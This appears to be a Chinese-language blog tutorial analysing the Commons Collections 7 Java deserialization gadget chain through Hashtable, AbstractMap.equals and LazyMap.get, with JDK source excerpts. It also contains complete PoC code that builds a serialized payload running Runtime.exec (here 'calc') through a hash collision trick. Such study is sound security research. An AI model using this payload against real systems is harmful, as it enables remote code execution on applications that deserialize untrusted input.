# CommonsCollections7 analyze

# 0x00

其实感觉都不算太复杂,链子的思路这些,难点再与如何编写`PoC`​

首先我们从链首开始看起,也就是`HashTable::readObject()`​这个方法

```java
private void readObject(java.io.ObjectInputStream s)
         throws IOException, ClassNotFoundException
    {
        s.defaultReadObject();
        int origlength = s.readInt();
        int elements = s.readInt();
        int length = (int)(elements * loadFactor) + (elements / 20) + 3;
        if (length > elements && (length & 1) == 0)
            length--;
        if (origlength > 0 && length > origlength)
            length = origlength;
        table = new Entry<?,?>[length];
        threshold = (int)Math.min(length * loadFactor, MAX_ARRAY_SIZE + 1);
        count = 0;

        // Read the number of elements and then all the key/value objects
        for (; elements > 0; elements--) {
            @SuppressWarnings("unchecked")
                K key = (K)s.readObject();
            @SuppressWarnings("unchecked")
                V value = (V)s.readObject();
            reconstitutionPut(table, key, value);
        }
    }
```

可以看到这里最末尾调用了`reconstitutionPut()`​方法

我们直接跟进

```java
private void reconstitutionPut(Entry<?,?>[] tab, K key, V value)
        throws StreamCorruptedException
    {
        if (value == null) {
            throw new java.io.StreamCorruptedException();
        }
        int hash = key.hashCode();
        int index = (hash & 0x7FFFFFFF) % tab.length;
        for (Entry<?,?> e = tab[index] ; e != null ; e = e.next) {
            if ((e.hash == hash) && e.key.equals(key)) {
                throw new java.io.StreamCorruptedException();
            }
        }
        @SuppressWarnings("unchecked")
            Entry<K,V> e = (Entry<K,V>)tab[index];
        tab[index] = new Entry<>(hash, key, value, e);
        count++;
    }
```

发现`reconstitutionPut()`​方法调用了两个比较关键的方法,一个是`hashCode()`​,另一个则是`equals()`​方法,跟进`hashCode()`​就和`CC6`​的链子差不多,所以我们这里选择跟进`equals()`​方法

因为有很多类都使用了`equals()`​方法,所以我们直接定位到`AbstractMapDecorator`​这个类的`equals()`​方法

```java
    public boolean equals(Object object) {
        return object == this ? true : this.map.equals(object);
    }
```

可以发现这里又调用了`equals()`​方法,因为我们的后半段其实是需要拼接到`LazyMap::get()`​才能够实现`RCE`​的,所以我们这里需要找到一个能够触发`get()`​的`equals()`​方法,我们可以找到`AbstractMap`​这个类的`equals()`​方法

```java
    public boolean equals(Object o) {
        if (o == this)
            return true;
        if (!(o instanceof Map))
            return false;
        Map<?,?> m = (Map<?,?>) o;
        if (m.size() != size())
            return false;
        try {
            Iterator<Entry<K,V>> i = entrySet().iterator();
            while (i.hasNext()) {
                Entry<K,V> e = i.next();
                K key = e.getKey();
                V value = e.getValue();
                if (value == null) {
                    if (!(m.get(key)==null && m.containsKey(key)))
                        return false;
                } else {
                    if (!value.equals(m.get(key)))
                        return false;
                }
            }
        } catch (ClassCastException unused) {
            return false;
        } catch (NullPointerException unused) {
            return false;
        }
        return true;
    }
```

可以发现这个里面调用了`m.get()`​,而`m`​就是`get()`​方法接受的参数`o`​ 也就是说我们只要传入一个`LazyMap`​的对象作为`o`​就可以触发`LazeMap::get()`​

但是我们现在的问题是怎么触发`AbstractMap::get()`​我们可以看到`yso`​给的`PoC`​

​`yso`​是传入了两个`HashMap`​对象作为`AbstractMapDecorator`​这个类的`map`​值,也就是说`this.map.equals(object)`​这里回去找`HashMap`​的`equals()`​方法,但是`HashMap`​本身是没有`equals()`​方法的,所以这里是调用了`HashMap`​继承的`AbstractMap`​的`equals()`​方法来触发的`LazeMap::get()`​

# 0x01

链子的思路我们就整理出来了

```java
Hashtable::readObject() -> reconstitutionPut() -> AbstractMapDecorator::equals() -> HashMap(AbstractMap)::equals -> LazyMap::get()
```

接下来我们就可以着手开始写`PoC`​

首先构造`LazeMap::get()`​的利用链

```java
package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class CC7 {
    public static void main(String[] args) throws IOException, NoSuchFieldException, ClassNotFoundException, IllegalAccessException, InvocationTargetException, NoSuchMethodException {
        exp();
    }
    public static void exp() throws IllegalAccessException, NoSuchFieldException, IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, null}),
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        new Object[]{"calc.exe"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> hashMap = new HashMap<>();
        Map decorateMap = LazyMap.decorate(hashMap, chainedTransformer);

        Class<LazyMap> lazyMapClass = LazyMap.class;
        Method lazyGetMethod = lazyMapClass.getDeclaredMethod("get", Object.class);
        lazyGetMethod.setAccessible(true);
        lazyGetMethod.invoke(decorateMap, chainedTransformer);

//        serialize(hashtable);
//        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
```

然后我们来看到我们的入口类和跟进的`reconstitutionPut()`​方法

```java
    private void readObject(java.io.ObjectInputStream s)
         throws IOException, ClassNotFoundException
    {
        // Read in the length, threshold, and loadfactor
        s.defaultReadObject();

        // Read the original length of the array and number of elements
        int origlength = s.readInt();
        int elements = s.readInt();

        // Compute new size with a bit of room 5% to grow but
        // no larger than the original size.  Make the length
        // odd if it's large enough, this helps distribute the entries.
        // Guard against the length ending up zero, that's not valid.
        int length = (int)(elements * loadFactor) + (elements / 20) + 3;
        if (length > elements && (length & 1) == 0)
            length--;
        if (origlength > 0 && length > origlength)
            length = origlength;
        table = new Entry<?,?>[length];
        threshold = (int)Math.min(length * loadFactor, MAX_ARRAY_SIZE + 1);
        count = 0;

        // Read the number of elements and then all the key/value objects
        for (; elements > 0; elements--) {
            @SuppressWarnings("unchecked")
                K key = (K)s.readObject();
            @SuppressWarnings("unchecked")
                V value = (V)s.readObject();
            // synch could be eliminated for performance
            reconstitutionPut(table, key, value);
        }
    }

    private void reconstitutionPut(Entry<?,?>[] tab, K key, V value)
        throws StreamCorruptedException
    {
        if (value == null) {
            throw new java.io.StreamCorruptedException();
        }
        // Makes sure the key is not already in the hashtable.
        // This should not happen in deserialized version.
        int hash = key.hashCode();
        int index = (hash & 0x7FFFFFFF) % tab.length;
        for (Entry<?,?> e = tab[index] ; e != null ; e = e.next) {
            if ((e.hash == hash) && e.key.equals(key)) {
                throw new java.io.StreamCorruptedException();
            }
        }
        // Creates the new entry.
        @SuppressWarnings("unchecked")
            Entry<K,V> e = (Entry<K,V>)tab[index];
        tab[index] = new Entry<>(hash, key, value, e);
        count++;
    }
```

我们可以发现我们的`reconstitutionPut()`​方法是在`readObject()`​方法的`for`​循环遍历的

​`而e.key.equals(key)`​也是在`for`​循环里面的,但是我们需要进入到这个`for`​循环才能触发

为什么说需要进入这个循环而不是和`reconstitutionPut()`​方法一样直接就可以用呢

我们可以看到这个`for`​循环,将`e`​赋予了`tab[index]`​的值,但是第一次循环的时候,`tab[index]`​的值是空的,直到下面的`tab[index] = new Entry<>(hash, key, value, e);`​才被赋予

所以只有`reconstitutionPut()`​第二次执行,才能够触发`e.key.equals(key)`​

但是此时我们还需要注意一点,`Java`​中存在短路运算符,也就是说`&&`​如果前面的语句不为真,那么就会忽略后面的语句,所以我们这里还需要让`e.hash == hash`​

也就是我们第二次循环取出来的`tab[index]`​值要等于第三次循环取出来的`tab[index]`​的值

而这里的`hash`​值是由`key.hashcode()`​运算出来的,而`Java`​中正好有一个小`bug`​可以满足我们这里的需求,也就是`yy.hashcode() == zZ.hashcode()`​的

我们就可以得到如下`PoC`​

```java
package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class CC7 {
    public static void main(String[] args) throws IOException, NoSuchFieldException, ClassNotFoundException, IllegalAccessException, InvocationTargetException, NoSuchMethodException {
        exp();
    }
    public static void exp() throws IllegalAccessException, NoSuchFieldException, IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, null}),
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        new Object[]{"calc.exe"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> hashMap1 = new HashMap<>();
        HashMap<Object, Object> hashMap2 = new HashMap<>();
        Map decorateMap1 = LazyMap.decorate(hashMap1, chainedTransformer);
        Map decorateMap2 = LazyMap.decorate(hashMap2, chainedTransformer);
        decorateMap1.put("yy",1);
        decorateMap2.put("zZ",2);
//        Class<LazyMap> lazyMapClass = LazyMap.class;
//        Method lazyGetMethod = lazyMapClass.getDeclaredMethod("get", Object.class);
//        lazyGetMethod.setAccessible(true);
//        lazyGetMethod.invoke(decorateMap, chainedTransformer);
        Hashtable hashtable = new Hashtable();
        hashtable.put(decorateMap1, 1);
        hashtable.put(decorateMap2, 2);
        decorateMap2.remove("yy");
        serialize(hashtable);
        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}

```

这里为什么要进行`remove()`​操作呢?因为`HashTable.put()`​方法实际上也会调用到`equals()`​方法,当调用完`equals()`​方法后,`LazyMap2`​的`key`​就会增加一个`yy`​键值,也就不能够满足后面的条件了(构造序列化的时候是可以触发的,但是反序列化的时候就不可以了),所以我们需要通过`remove()`​来删除掉

最终我们的`PoC`​

```java
package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class CC7 {
    public static void main(String[] args) throws IOException, NoSuchFieldException, ClassNotFoundException, IllegalAccessException, InvocationTargetException, NoSuchMethodException {
        exp();
    }
    public static void exp() throws IllegalAccessException, NoSuchFieldException, IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class), // 构造 setValue 的可控参数
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke"
                        , new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{});
        HashMap<Object, Object> hashMap1 = new HashMap<>();
        HashMap<Object, Object> hashMap2 = new HashMap<>();
        Map decorateMap1 = LazyMap.decorate(hashMap1, chainedTransformer);
        decorateMap1.put("yy", 1);
        Map decorateMap2 = LazyMap.decorate(hashMap2, chainedTransformer);
        decorateMap2.put("zZ", 1);
        Hashtable hashtable = new Hashtable();
        hashtable.put(decorateMap1, 1);
        hashtable.put(decorateMap2, 1);
        Class c = ChainedTransformer.class;
        Field field = c.getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(chainedTransformer, transformers);
        decorateMap2.remove("yy");
        serialize(hashtable);
        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
```
